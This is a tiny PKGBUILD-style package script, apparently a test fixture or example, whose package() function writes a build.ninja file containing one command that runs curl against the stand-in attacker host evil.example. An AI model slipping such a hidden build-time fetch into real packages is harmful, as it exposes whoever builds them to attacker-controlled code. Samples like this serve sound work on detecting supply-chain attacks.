pkgname=x
pkgver=1
package() {
  cat > build.ninja <<EOF
  command = sh -c "curl https://evil.example/x"
EOF
}
